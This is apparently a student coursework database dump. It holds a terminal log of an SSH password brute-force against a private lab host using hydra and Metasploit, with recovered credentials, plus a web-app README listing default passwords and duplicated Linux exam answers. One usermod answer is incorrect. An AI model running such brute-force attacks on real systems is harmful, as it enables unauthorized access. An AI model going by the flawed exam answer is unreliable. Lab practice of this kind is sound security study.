(8, 2, 'sshOA1', 'command_log_20241124_024144.txt', 'Script started on 2024-11-24 02:41:44-05:00 [COMMAND=\"bash\" TERM=\"xterm-256color\" TTY=\"/dev/pts/0\" COLUMNS=\"77\" LINES=\"27\"]\n[~]\n\n$ yhydra -L users.txt -P passwords.txt ssh://192.168.43.133\nhydra -L users.txt -P passwords.txt ssh://192.168.43.133\n\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-24 02:44:14\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[ERROR] File for logins not found: users.txt\n\n[~]\n\n$ cd /Desktop\n\nbash: cd: /Desktop: No such file or directory\n\n[~]\n\n$ cd /Desktop~/Desktop\n\n\n[~/Desktop]\n$ hydra -L users.txt -P passwords.txt ssh://192.168.43.133\nhydra -L users.txt -P passwords.txt ssh://192.168.43.133\n\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-24 02:44:45\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task\n[DATA] attacking ssh://192.168.43.133:22/\n[22][ssh] host: 192.168.43.133   login: yiyangtan   password: kali\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-24 02:44:50\n\n[~/Desktop]\n$ msfconsole\nmsfconsole\n\nMetasploit tip: Use sessions -1 to interact with the last opened session\n[*] Starting the Metasploit Framework console.../\n[*] Starting the Metasploit Framework console...-\n[*] Starting the Metasploit Framework console...\\\n[*] starting the Metasploit Framework console...|\n[*] STarting the Metasploit Framework console.../\n[*] StArting the Metasploit Framework console...-\n[*] StaRting the Metasploit Framework console...\\\n[*] StarTing the Metasploit Framework console...|\n[*] StartIng the Metasploit Framework console.../\n[*] StartiNg the Metasploit Framework console...-\n[*] StartinG the Metasploit Framework console...\\\n[*] Starting the Metasploit Framework console...|\n[*] Starting The Metasploit Framework console.../\n[*] Starting tHe Metasploit Framework console...-\n[*] Starting thE Metasploit Framework console...\\\n[*] Starting the Metasploit Framework console...|\n[*] Starting the metasploit Framework console.../\n[*] Starting the MEtasploit Framework console...-\n[*] Starting the MeTasploit Framework console...\\\n[*] Starting the MetAsploit Framework console...|\n[*] Starting the MetaSploit Framework console.../\n[*] Starting the MetasPloit Framework console...-\n[*] Starting the MetaspLoit Framework console...\\\n[*] Starting the MetasplOit Framework console...|\n[*] Starting the MetasploIt Framework console.../\n[*] Starting the MetasploiT Framework console...-\n[*] Starting the Metasploit Framework console...\\\n[*] Starting the Metasploit framework console...|\n[*] Starting the Metasploit FRamework console.../\n[*] Starting the Metasploit FrAmework console...-\n[*] Starting the Metasploit FraMework console...\\\n[*] Starting the Metasploit FramEwork console...|\n[*] Starting the Metasploit FrameWork console.../\n[*] Starting the Metasploit FramewOrk console...-\n[*] Starting the Metasploit FramewoRk console...\\\n[*] Starting the Metasploit FrameworK console...|\n[*] Starting the Metasploit Framework console.../\n[*] Starting the Metasploit Framework Console...-\n[*] Starting the Metasploit Framework cOnsole...\\\n[*] Starting the Metasploit Framework coNsole...|\n[*] Starting the Metasploit Framework conSole.../\n[*] Starting the Metasploit Framework consOle...-\n[*] Starting the Metasploit Framework consoLe...\\\n[*] Starting the Metasploit Framework consolE...|\n[*] Starting the Metasploit Framework console.../\n[*] Starting the Metasploit Framework console...-\n[*] Starting the Metasploit Framework console...\\\n[*] Starting the Metasploit Framework console...|\n\n                                                  \nCall trans opt: received. 2-19-98 13:24:18 REC:Loc\n\n     Trace program: running\n\n           wake up, Neo...\n        the matrix has you\n      follow the white rabbit.\n\n          knock, knock, Neo.\n\n                        (`.         ,-,\n                        ` `.    ,;\' /\n                         `.  ,\'/ .\'\n                          `. X /.\'\n                .-;--\'\'--.._` ` (\n              .\'            /   `\n             ,           ` \'   Q \'\n             ,         ,   `._    \\\n          ,.|         \'     `-.;_\'\n          :  . `  ;    `  ` --,.._;\n           \' `    ,   )   .\'\n              `._ ,  \'   /_\n                 ; ,\'\'-,;\' ``-\n                  ``-..__``--`\n\n                             https://metasploit.com\n\n\n       =[ metasploit v6.4.9-dev                           ]\n+ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]\n+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]\n+ -- --=[ 9 evasion                                       ]\n\nMetasploit Documentation: https://docs.metasploit.com/\n\nmsf6 > search ssh\n\n\nMatching Modules\n================\n\n   #    Name                                                               Disclosure Date  Rank       Check  Description\n   -    ----                                                               ---------------  ----       -----  -----------\n   0    exploit/linux/http/alienvault_exec                                 2017-01-31       excellent  Yes    AlienVault OSSIM/USM Remote Code Execution\n   1    auxiliary/scanner/ssh/apache_karaf_command_execution               2016-02-09       normal     No     Apache Karaf Default Credentials Command Execution\n   2    auxiliary/scanner/ssh/karaf_login                                  .                normal     No     Apache Karaf Login Utility\n   3    exploit/apple_ios/ssh/cydia_default_ssh                            2007-07-02       excellent  No     Apple iOS Default SSH Password Vulnerability\n   4    exploit/unix/ssh/arista_tacplus_shell                              2020-02-02       great      Yes    Arista restricted shell escape (with privesc)\n   5    exploit/unix/ssh/array_vxag_vapv_privkey_privesc                   2014-02-03       excellent  No     Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution\n   6    exploit/linux/ssh/ceragon_fibeair_known_privkey                    2015-04-01       excellent  No     Ceragon FibeAir IP-10 SSH Private Key Exposure\n   7    auxiliary/scanner/ssh/cerberus_sftp_enumusers                      2014-05-27       normal     No     Cerberus FTP Server SFTP Username Enumeration\n   8    auxiliary/dos/cisco/cisco_7937g_dos                                2020-06-02       normal     No     Cisco 7937G Denial-of-Service Attack\n   9    auxiliary/admin/http/cisco_7937g_ssh_privesc                       2020-06-02       normal     No     Cisco 7937G SSH Privilege Escalation\n   10   exploit/linux/http/cisco_asax_sfr_rce                              2022-06-22       excellent  Yes    Cisco ASA-X with FirePOWER Services Authenticated Command Injection\n   11     \\_ target: Shell Dropper                                         .                .          .      .\n   12     \\_ target: Linux Dropper                                         .                .          .      .\n   13   auxiliary/scanner/http/cisco_firepower_login                       .                normal     No     Cisco Firepower Management Console 6.0 Login\n   14   exploit/linux/ssh/cisco_ucs_scpuser                                2019-08-21       excellent  No     Cisco UCS Director default scpuser password\n   15   auxiliary/scanner/ssh/eaton_xpert_backdoor                         2018-07-18       normal     No     Eaton Xpert Meter SSH Private Key Exposure Scanner\n   16   exploit/linux/ssh/exagrid_known_privkey                            2016-04-07       excellent  No     ExaGrid Known SSH Key and Default Password\n   17   exploit/linux/ssh/f5_bigip_known_privkey                           2012-06-11       excellent  No     F5 BIG-IP SSH Private Key Exposure\n   18   exploit/linux/http/fortinet_authentication_bypass_cve_2022_40684   2022-10-10       excellent  Yes    Fortinet FortiOS, FortiProxy, and FortiSwitchManager authentication bypass.\n   19   auxiliary/scanner/ssh/fortinet_backdoor                            2016-01-09       normal     No     Fortinet SSH Backdoor Scanner\n   20   post/windows/manage/forward_pageant                                .                normal     No     Forward SSH Agent Requests To Remote Pageant\n   21   exploit/windows/ssh/freeftpd_key_exchange                          2006-05-12       average    No     FreeFTPd 1.0.10 Key Exchange Algorithm String Buffer Overflow\n   22     \\_ target: Windows 2000 SP0-SP4 English                          .                .          .      .\n   23     \\_ target: Windows 2000 SP0-SP4 German                           .                .          .      .\n   24     \\_ target: Windows XP SP0-SP1 English                            .                .          .      .\n   25     \\_ target: Windows XP SP2 English                                .                .          .      .\n   26   exploit/windows/ssh/freesshd_key_exchange                          2006-05-12       average    No     FreeSSHd 1.0.9 Key Exchange Algorithm String Buffer Overflow\n   27     \\_ target: Windows 2000 Pro SP4 English                          .                .          .      .\n   28     \\_ target: Windows XP Pro SP0 English                            .                .          .      .\n   29     \\_ target: Windows XP Pro SP1 English                            .                .          .      .\n   30   exploit/windows/ssh/freesshd_authbypass                            2010-08-11       excellent  Yes    Freesshd Authentication Bypass\n   31     \\_ target: PowerShell                                            .                .          .      .\n   32     \\_ target: CmdStager upload                                      .                .          .      .\n   33   auxiliary/scanner/http/gitlab_user_enum                            2014-11-21       normal     No     GitLab User Enumeration\n   34   exploit/multi/http/gitlab_shell_exec                               2013-11-04       excellent  Yes    Gitlab-shell Code Execution\n   35     \\_ target: Linux                                                 .                .          .      .\n   36     \\_ target: Linux (x64)                                           .                .          .      .\n   37     \\_ target: Unix (CMD)                                            .                .          .      .\n   38     \\_ target: Python                                                .                .          .      .\n   39   exploit/linux/ssh/ibm_drm_a3user                                   2020-04-21       excellent  No     IBM Data Risk Manager a3user Default Password\n   40   post/windows/manage/install_ssh                                    .                normal     No     Install OpenSSH for Windows\n   41   payload/generic/ssh/interact                                       .                normal     No     Interact with Established SSH Connection\n   42   post/multi/gather/jenkins_gather                                   .                normal     No     Jenkins Credential Collector\n   43   auxiliary/scanner/ssh/juniper_backdoor                             2015-12-20       normal     No     Juniper SSH Backdoor Scanner\n   44   exploit/freebsd/http/junos_phprc_auto_prepend_file                 2023-08-17       excellent  Yes    Junos OS PHPRC Environment Variable Manipulation RCE\n   45     \\_ target: PHP In-Memory                                         .                .          .      .\n   46     \\_ target: Interactive SSH with jail break                       .                .          .      .\n   47   auxiliary/scanner/ssh/detect_kippo                                 .                normal     No     Kippo SSH Honeypot Detector\n   48   post/linux/gather/enum_network                                     .                normal     No     Linux Gather Network Information\n   49   exploit/linux/local/ptrace_traceme_pkexec_helper                   2019-07-04       excellent  Yes    Linux Polkit pkexec helper PTRACE_TRACEME local root exploit\n   50   exploit/linux/ssh/loadbalancerorg_enterprise_known_privkey         2014-03-17       excellent  No     Loadbalancer.org Enterprise VA SSH Private Key Exposure\n   51   exploit/multi/http/git_submodule_command_exec                      2017-08-10       excellent  No     Malicious Git HTTP Server For CVE-2017-1000117\n   52   exploit/linux/ssh/mercurial_ssh_exec                               2017-04-18       excellent  No     Mercurial Custom hg-ssh Wrapper Remote Code Exec\n   53   exploit/linux/ssh/microfocus_obr_shrboadmin                        2020-09-21       excellent  No     Micro Focus Operations Bridge Reporter shrboadmin default password\n   54   post/multi/gather/ssh_creds                                        .                normal     No     Multi Gather OpenSSH PKI Credentials Collection\n   55   exploit/solaris/ssh/pam_username_bof                               2020-10-20       normal     Yes    Oracle Solaris SunSSH PAM parse_user_name() Buffer Overflow\n   56     \\_ target: SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware      .                .          .      .\n   57     \\_ target: SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VirtualBox  .                .          .      .\n   58   auxiliary/gather/prometheus_api_gather                             2016-07-01       normal     No     Prometheus API Information Gather\n   59   exploit/windows/ssh/putty_msg_debug                                2002-12-16       normal     No     PuTTY Buffer Overflow\n   60     \\_ target: Windows 2000 SP4 English                              .                .          .      .\n   61     \\_ target: Windows XP SP2 English                                .                .          .      .\n   62     \\_ target: Windows 2003 SP1 English                              .                .          .      .\n   63   post/windows/gather/enum_putty_saved_sessions                      .                normal     No     PuTTY Saved Sessions Enumeration Module\n   64   auxiliary/gather/qnap_lfi                                          2019-11-25       normal     Yes    QNAP QTS and Photo Station Local File Inclusion\n   65   exploit/linux/ssh/quantum_dxi_known_privkey                        2014-03-17       excellent  No     Quantum DXi V1000 SSH Private Key Exposure\n   66   exploit/linux/ssh/quantum_vmpro_backdoor                           2014-03-17       excellent  No     Quantum vmPRO Backdoor Command\n   67   auxiliary/fuzzers/ssh/ssh_version_15                               .                normal     No     SSH 1.5 Version Fuzzer\n   68   auxiliary/fuzzers/ssh/ssh_version_2                                .                normal     No     SSH 2.0 Version Fuzzer\n   69   auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                          .                normal     No     SSH Key Exchange Init Corruption\n   70   post/linux/manage/sshkey_persistence                               .                excellent  No     SSH Key Persistence\n   71   post/windows/manage/sshkey_persistence                             .                good       No     SSH Key Persistence\n   72   auxiliary/scanner/ssh/ssh_login                                    .                normal     No     SSH Login Check Scanner\n   73   auxiliary/scanner/ssh/ssh_identify_pubkeys                         .                normal     No     SSH Public Key Acceptance Scanner\n   74   auxiliary/scanner/ssh/ssh_login_pubkey                             .                normal     No     SSH Public Key Login Scanner\n   75   exploit/multi/ssh/sshexec                                          1999-01-01       manual     No     SSH User Code Execution\n   76     \\_ target: Linux Command                                         .                .          .      .\n   77     \\_ target: Linux x86                                             .                .          .      .\n   78     \\_ target: Linux x64                                             .                .          .      .\n   79     \\_ target: Linux armle                                           .                .          .      .\n   80     \\_ target: Linux mipsle                                          .                .          .      .\n   81     \\_ target: Linux mipsbe                                          .                .          .      .\n   82     \\_ target: Linux aarch64                                         .                .          .      .\n   83     \\_ target: OSX x86                                               .                .          .      .\n   84     \\_ target: OSX x64                                               .                .          .      .\n   85     \\_ target: BSD x86                                               .                .          .      .\n   86     \\_ target: BSD x64                                               .                .          .      .\n   87     \\_ target: Python                                                .                .          .      .\n   88     \\_ target: Unix Cmd                                              .                .          .      .\n   89     \\_ target: Interactive SSH                                       .                .          .      .\n   90   auxiliary/scanner/ssh/ssh_enumusers                                .                normal     No     SSH Username Enumeration\n   91     \\_ action: Malformed Packet                                      .                .          .      Use a malformed packet\n   92     \\_ action: Timing Attack                                         .                .          .      Use a timing attack\n   93   auxiliary/fuzzers/ssh/ssh_version_corrupt                          .                normal     No     SSH Version Corruption\n   94   auxiliary/scanner/ssh/ssh_version                                  .                normal     No     SSH Version Scanner\n   95   post/multi/gather/saltstack_salt                                   .                normal     No     SaltStack Salt Information Gatherer\n   96   exploit/unix/http/schneider_electric_net55xx_encoder               2019-01-25       excellent  Yes    Schneider Electric Pelco Endura NET55XX Encoder\n   97   exploit/windows/ssh/securecrt_ssh1                                 2002-07-23       average    No     SecureCRT SSH1 Buffer Overflow\n   98   exploit/linux/ssh/solarwinds_lem_exec                              2017-03-17       excellent  No     SolarWinds LEM Default SSH Password Remote Code Execution\n   99   exploit/linux/http/sourcegraph_gitserver_sshcmd                    2022-02-18       excellent  Yes    Sourcegraph gitserver sshCommand RCE\n   100    \\_ target: Automatic                                             .                .          .      .\n   101    \\_ target: Unix Command                                          .                .          .      .\n   102    \\_ target: Linux Dropper                                         .                .          .      .\n   103  exploit/linux/ssh/symantec_smg_ssh                                 2012-08-27       excellent  No     Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability\n   104  exploit/linux/http/symantec_messaging_gateway_exec                 2017-04-26       excellent  No     Symantec Messaging Gateway Remote Code Execution\n   105  exploit/windows/ssh/sysax_ssh_username                             2012-02-27       normal     Yes    Sysax 5.53 SSH Username Buffer Overflow\n   106    \\_ target: Sysax 5.53 on Win XP SP3 / Win2k3 SP0                 .                .          .      .\n   107    \\_ target: Sysax 5.53 on Win2K3 SP1/SP2                          .                .          .      .\n   108  auxiliary/dos/windows/ssh/sysax_sshd_kexchange                     2013-03-17       normal     No     Sysax Multi-Server 6.10 SSHD Key Exchange Denial of Service\n   109  exploit/unix/ssh/tectia_passwd_changereq                           2012-12-01       excellent  Yes    Tectia SSH USERAUTH Change Request Password Reset Vulnerability\n   110  auxiliary/scanner/ssh/ssh_enum_git_keys                            .                normal     No     Test SSH Github Access\n   111  exploit/linux/http/ubiquiti_airos_file_upload                      2016-02-13       excellent  No     Ubiquiti airOS Arbitrary File Upload\n   112  payload/cmd/unix/reverse_ssh                                       .                normal     No     Unix Command Shell, Reverse TCP SSH\n   113  payload/cmd/unix/bind_aws_instance_connect                         .                normal     No     Unix SSH Shell, Bind Instance Connect (via AWS API)\n   114  exploit/linux/ssh/vmware_vrni_known_privkey                        2023-08-29       excellent  No     VMWare Aria Operations for Networks (vRealize Network Insight) SSH Private Key Exposure\n   115    \\_ target: 6.0_platform                                          .                .          .      .\n   116    \\_ target: 6.0_proxy                                             .                .          .      .\n   117    \\_ target: 6.1_platform                                          .                .          .      .\n   118    \\_ target: 6.1_proxy                                             .                .          .      .\n   119    \\_ target: 6.2_collector                                         .                .          .      .\n   120    \\_ target: 6.2_platform                                          .                .          .      .\n   121    \\_ target: 6.3_collector                                         .                .          .      .\n   122    \\_ target: 6.3_platform                                          .                .          .      .\n   123    \\_ target: 6.4_collector                                         .                .          .      .\n   124    \\_ target: 6.4_platform                                          .                .          .      .\n   125    \\_ target: 6.5_collector                                         .                .          .      .\n   126    \\_ target: 6.5_platform                                          .                .          .      .\n   127    \\_ target: 6.6_collector                                         .                .          .      .\n   128    \\_ target: 6.6_platform                                          .                .          .      .\n   129    \\_ target: 6.7_collector                                         .                .          .      .\n   130    \\_ target: 6.7_platform                                          .                .          .      .\n   131    \\_ target: 6.8_collector                                         .                .          .      .\n   132    \\_ target: 6.8_platform                                          .                .          .      .\n   133    \\_ target: 6.9_collector                                         .                .          .      .\n   134    \\_ target: 6.9_platform                                          .                .          .      .\n   135    \\_ target: 6.10_collector                                        .                .          .      .\n   136    \\_ target: 6.10_platform                                         .                .          .      .\n   137    \\_ target: All                                                   .                .          .      .\n   138  exploit/linux/ssh/vmware_vdp_known_privkey                         2016-12-20       excellent  No     VMware VDP Known SSH Key\n   139  exploit/multi/http/vmware_vcenter_uploadova_rce                    2021-02-23       manual     Yes    VMware vCenter Server Unauthenticated OVA File Upload RCE\n   140    \\_ target: VMware vCenter Server <= 6.7 Update 1b (Linux)        .                .          .      .\n   141    \\_ target: VMware vCenter Server <= 6.7 Update 3j (Windows)      .                .          .      .\n   142  exploit/linux/ssh/vyos_restricted_shell_privesc                    2018-11-05       great      Yes    VyOS restricted-shell Escape and Privilege Escalation\n   143  post/windows/gather/credentials/whatsupgold_credential_dump        2022-11-22       manual     No     WhatsUp Gold Credentials Dump\n   144    \\_ action: Decrypt                                               .                .          .      Decrypt WhatsUp Gold database export CSV file\n   145    \\_ action: Dump                                                  .                .          .      Export WhatsUp Gold database and perform decryption\n   146    \\_ action: Export                                                .                .          .      Export WhatsUp Gold database without decryption\n   147  post/windows/gather/credentials/mremote                            .                normal     No     Windows Gather mRemote Saved Password Extraction\n   148  exploit/windows/local/unquoted_service_path                        2001-10-25       great      Yes    Windows Unquoted Service Path Privilege Escalation\n   149  exploit/linux/http/zyxel_lfi_unauth_ssh_rce                        2022-02-01       excellent  Yes    Zyxel chained RCE using LFI and weak password derivation algorithm\n   150    \\_ target: Unix Command                                          .                .          .      .\n   151    \\_ target: Linux Dropper                                         .                .          .      .\n   152    \\_ target: Interactive SSH                                       .                .          .      .\n   153  auxiliary/scanner/ssh/libssh_auth_bypass                           2018-10-16       normal     No     libssh Authentication Bypass Scanner\n   154    \\_ action: Execute                                               .                .          .      Execute a command\n   155    \\_ action: Shell                                                 .                .          .      Spawn a shell\n   156  exploit/linux/http/php_imap_open_rce                               2018-10-23       good       Yes    php imap_open Remote Code Execution\n   157    \\_ target: prestashop                                            .                .          .      .\n   158    \\_ target: suitecrm                                              .                .          .      .\n   159    \\_ target: e107v2                                                .                .          .      .\n   160    \\_ target: Horde IMP H3                                          .                .          .      .\n   161    \\_ target: custom                                                .                .          .      .\n\n\nInteract with a module by name or index. For example info 161, use 161 or use exploit/linux/http/php_imap_open_rce\nAfter interacting with a module you can manually set a TARGET with set TARGET \'custom\'\n\nmsf6 > use auxiliary/scanner/ssh/ssh_login\n\nmsf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.43.133\n\nrhosts => 192.168.43.133\nmsf6 auxiliary(scanner/ssh/ssh_login) > set stop_on_success true\n\nstop_on_success => true\nmsf6 auxiliary(scanner/ssh/ssh_login) > set user_file users.txt\n\nuser_file => users.txt\nmsf6 auxiliary(scanner/ssh/ssh_login) > set pass_file passwords.txt\n\npass_file => passwords.txt\nmsf6 auxiliary(scanner/ssh/ssh_login) > set verbose true\n\nverbose => true\nmsf6 auxiliary(scanner/ssh/ssh_login) > run\n\n\n[*] 192.168.43.133:22 - Starting bruteforce\n[-] 192.168.43.133:22 - Failed: \'kali:admin\'\n[!] No active DB -- Credential data will not be saved!\n[-] 192.168.43.133:22 - Failed: \'kali:yiyantan\'\n[-] 192.168.43.133:22 - Failed: \'kali:abc123\'\n[-] 192.168.43.133:22 - Failed: \'kali:kali\'\n[-] 192.168.43.133:22 - Failed: \'tarumt:admin\'\n[-] 192.168.43.133:22 - Failed: \'tarumt:yiyantan\'\n[-] 192.168.43.133:22 - Failed: \'tarumt:abc123\'\n[-] 192.168.43.133:22 - Failed: \'tarumt:kali\'\n[-] 192.168.43.133:22 - Failed: \'admin:admin\'\n[-] 192.168.43.133:22 - Failed: \'admin:yiyantan\'\n[-] 192.168.43.133:22 - Failed: \'admin:abc123\'\n[-] 192.168.43.133:22 - Failed: \'admin:kali\'\n[-] 192.168.43.133:22 - Failed: \'yiyangtan:admin\'\n[-] 192.168.43.133:22 - Failed: \'yiyangtan:yiyantan\'\n[-] 192.168.43.133:22 - Failed: \'yiyangtan:abc123\'\n[+] 192.168.43.133:22 - Success: \'yiyangtan:kali\' \'\'\n[*] SSH session 1 opened (192.168.43.130:36359 -> 192.168.43.133:22) at 2024-11-24 02:46:41 -0500\n[-] 192.168.43.133:22 - While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with \'set gatherproof false\'.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with device details so it can be handled in the future.\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf6 auxiliary(scanner/ssh/ssh_login) > exit\n\n[*] You have active sessions open, to exit anyway type \"exit -y\"\nmsf6 auxiliary(scanner/ssh/ssh_login) > exit -y\n\n\n[~/Desktop]\n$ exit\n\nexit\n\nScript done on 2024-11-24 02:48:08-05:00 [COMMAND_EXIT_CODE=\"0\"]\n\n', '2024-12-03 16:25:52'),
(9, 2, 'sshOA2', 'README.txt', '###########################################\r\n##					 ##\r\n## Japan Online Ticket System README.txt ##\r\n##					 ##\r\n###########################################\r\n1. Launching the application\r\n	Requirement:\r\n		1) Apache NetBeans IDE 16 and above\r\n		2) XAMPP 8.2.12 / PHP 8.2.12 version and above\r\n		3) Composer 2.7.6 version and above\r\n\r\n	Installation step:\r\n		1）Download the source code zipped folder\r\n		2) Extract the zipped folder\r\n		3) Open XAMPP, start \"Apache\" & \"MySQL\"\r\n		4) Click \"Admin\" from MySQL\r\n		5) Click \"SQL\" inside the phpMyAdmin\r\n		5) Copy and paste the JapanTicketingDB.sql and click \"Go\"\r\n		6) Copy and paste the InsertData.sql and click \"Go\" \r\n		7) Open the command prompt and go to the extracted path.\r\n		8) Enter : composer install\r\n		\r\n\r\n	How to run:\r\n		1) Open the extracted folder from Apache NetBeans ADE 16\r\n		2) Right click the folder name, go to properties\r\n		3) Go to \"Run Configuration\"\r\n		4) Make sure the Project URL is : http://localhost/JapaneseOnlineTicketingSystem/, if not replace it.\r\n		5) Make sure the Index File is : index.php, if not replace it.\r\n		6) Click \"Ok\"\r\n		7) Run the program (**Ensure the Apache & MySQL is open in XAMPP**)\r\n\r\n2. User Account detail\r\n	A) Customer:\r\n		Username: customer1\r\n		Password: cust1234!\r\n		Email: cust1@gmail.com\r\n\r\n	B) Admin:\r\n		Username: admin\r\n		Password: admin123!\r\n		Email: admin@gmail.com\r\n\r\n\r\n###########################################\r\n##					 ##\r\n## 	     END OF README.txt	 	 ##\r\n##					 ##\r\n###########################################\r\n', '2024-12-03 16:26:17'),
(10, 2, 'sshOB1', 'BAIT3113 System Administration PYP.txt', 'BAIT3113 System Administration PYP\r\n===================================\r\n5 JUNE 2024\r\n===========\r\nQuestion 1\r\na) There are two basic types of users in Linux - namely super and regular user.\r\n(i) Explain the difference between super user and regular user.\r\nANS:\r\nSuper user\r\n- The super user in Linux, often called root, has unrestricted access to the entire system.\r\n- They can perform all administrative task, including installing software, managing files, creating users, and altering system settings.\r\n- The super user can override any file permissions, meaning they have full control over all resources and configuration on the system.\r\n\r\nRegular user\r\n- A regular user has limited access to the system and  is typically restricted to their own home directory and files.\r\n- They can perform basic tasks like editing files, running applications, and creating personal directories, but cannot perform administrative functions.\r\n- To perform administrative tasks, regular users must use commands like sudo, which temporarily grants them elevated privileges for specific actions.\r\n\r\n(ii)In Linux system, the sudo command plays a crucial role in managing user privileges. Do you agree with the statement? Justify your answer with an appropriate example.\r\nANS:\r\n- Yes, I agree that the sudo command plays a crucial role in managing user privileges in a Linux system.\r\n- The sudo command allows a regular user to execute commands that typically require super user(root) privileges, without having to log in as the root user.\r\n- This enhances security by limiting root access and provides more control over which users can perform administrative tasks.\r\n- Example, if a user wants to update the system, which requires root privileges, they can use the sudo command as follows: sudo apt-get update\r\n\r\n\r\nb) User management includes everything from creating a user to deleting a user on your system. Write the Linux command(s) to accomplish the following user management tasks:\r\n(i) Create a user with the following requirements:\r\n    - The user login name is \"alice\"\r\n    - The user \"alice\" joined \"webuser\" group as her primary group.\r\n    - Default home to be created for user \"alice\" to park under /home/alice directory.\r\nANS:\r\nsudo useradd -m -g webuser alice\r\n\r\n(ii) Modify the user \"alice\" account properties based on the following requirements:\r\n    * Change the user \"alice\" home from /home/alice directory to /data/alice directory.\r\n    * Change the user \"alice\" user ID (UID) from \"1023\" to \"7531\"\r\nANS:\r\nsudo usermod -d /data/alice -m -u alice\r\n\r\n(iii) Delete the account of user \"alice\" and her home directory as well.\r\nANS:\r\nsudo userdel -r alice\r\n\r\n\r\nc) In Linux system, Access Control List(ACL) is one of the most fundamental mechanism to secure file or directory.\r\n(i) Discuss the advantages of using ACL compared to standard file permissions.\r\nANS:\r\n*Efficiency\r\n  - ACL allows settings permissions for multiple users and groups on the same file or directory, offering more detailed control compared to the standard owner, group, and others model.\r\n\r\n*User-Specific Permissions\r\n  - ACL enables assigning specific permissions to individual users, granting each user different levels of access (read, write, execute) on a single file or directory.\r\n\r\n(ii) With the use of appropriate example, write a Linux command to set an ACL for a specific user on a file.\r\nANS:\r\nsudo setfacl -m u:john:rwx filename.txt\r\n\r\n\r\nQuestion 2\r\n===========\r\na) Given the Linux system extract below (figure 1):\r\n(i) Refer to Figure 1, write a Linux command to change the group ownership of dirdylan directory from G1 to G2. Identify the type of user who possess the right to issue the above command.\r\nANS:\r\n\r\n(ii) Explain the three types of permission (read, write, execute) and their significance while applied to dirdylan directory.\r\nANS:\r\n\r\n(iii) Discuss the use of sticky bit in Linux file permissions. Write a Linux command to apply sticky bit to dirdylan directory.\r\nANS:\r\n\r\nb) Describe how to change file permissions using the chmod command.\r\n(Hint: In your answer, provide example(s) of symbolic and numeric representation for setting file permissions.)\r\n\r\n', '2024-12-03 16:26:30'),
(11, 2, 'sshOB2', 'BAIT3113 System Administration PYP.txt', 'BAIT3113 System Administration PYP\r\n===================================\r\n5 JUNE 2024\r\n===========\r\nQuestion 1\r\na) There are two basic types of users in Linux - namely super and regular user.\r\n(i) Explain the difference between super user and regular user.\r\nANS:\r\nSuper user\r\n- The super user in Linux, often called root, has unrestricted access to the entire system.\r\n- They can perform all administrative task, including installing software, managing files, creating users, and altering system settings.\r\n- The super user can override any file permissions, meaning they have full control over all resources and configuration on the system.\r\n\r\nRegular user\r\n- A regular user has limited access to the system and  is typically restricted to their own home directory and files.\r\n- They can perform basic tasks like editing files, running applications, and creating personal directories, but cannot perform administrative functions.\r\n- To perform administrative tasks, regular users must use commands like sudo, which temporarily grants them elevated privileges for specific actions.\r\n\r\n(ii)In Linux system, the sudo command plays a crucial role in managing user privileges. Do you agree with the statement? Justify your answer with an appropriate example.\r\nANS:\r\n- Yes, I agree that the sudo command plays a crucial role in managing user privileges in a Linux system.\r\n- The sudo command allows a regular user to execute commands that typically require super user(root) privileges, without having to log in as the root user.\r\n- This enhances security by limiting root access and provides more control over which users can perform administrative tasks.\r\n- Example, if a user wants to update the system, which requires root privileges, they can use the sudo command as follows: sudo apt-get update\r\n\r\n\r\nb) User management includes everything from creating a user to deleting a user on your system. Write the Linux command(s) to accomplish the following user management tasks:\r\n(i) Create a user with the following requirements:\r\n    - The user login name is \"alice\"\r\n    - The user \"alice\" joined \"webuser\" group as her primary group.\r\n    - Default home to be created for user \"alice\" to park under /home/alice directory.\r\nANS:\r\nsudo useradd -m -g webuser alice\r\n\r\n(ii) Modify the user \"alice\" account properties based on the following requirements:\r\n    * Change the user \"alice\" home from /home/alice directory to /data/alice directory.\r\n    * Change the user \"alice\" user ID (UID) from \"1023\" to \"7531\"\r\nANS:\r\nsudo usermod -d /data/alice -m -u alice\r\n\r\n(iii) Delete the account of user \"alice\" and her home directory as well.\r\nANS:\r\nsudo userdel -r alice\r\n\r\n\r\nc) In Linux system, Access Control List(ACL) is one of the most fundamental mechanism to secure file or directory.\r\n(i) Discuss the advantages of using ACL compared to standard file permissions.\r\nANS:\r\n*Efficiency\r\n  - ACL allows settings permissions for multiple users and groups on the same file or directory, offering more detailed control compared to the standard owner, group, and others model.\r\n\r\n*User-Specific Permissions\r\n  - ACL enables assigning specific permissions to individual users, granting each user different levels of access (read, write, execute) on a single file or directory.\r\n\r\n(ii) With the use of appropriate example, write a Linux command to set an ACL for a specific user on a file.\r\nANS:\r\nsudo setfacl -m u:john:rwx filename.txt\r\n\r\n\r\nQuestion 2\r\n===========\r\na) Given the Linux system extract below (figure 1):\r\n(i) Refer to Figure 1, write a Linux command to change the group ownership of dirdylan directory from G1 to G2. Identify the type of user who possess the right to issue the above command.\r\nANS:\r\n\r\n(ii) Explain the three types of permission (read, write, execute) and their significance while applied to dirdylan directory.\r\nANS:\r\n\r\n(iii) Discuss the use of sticky bit in Linux file permissions. Write a Linux command to 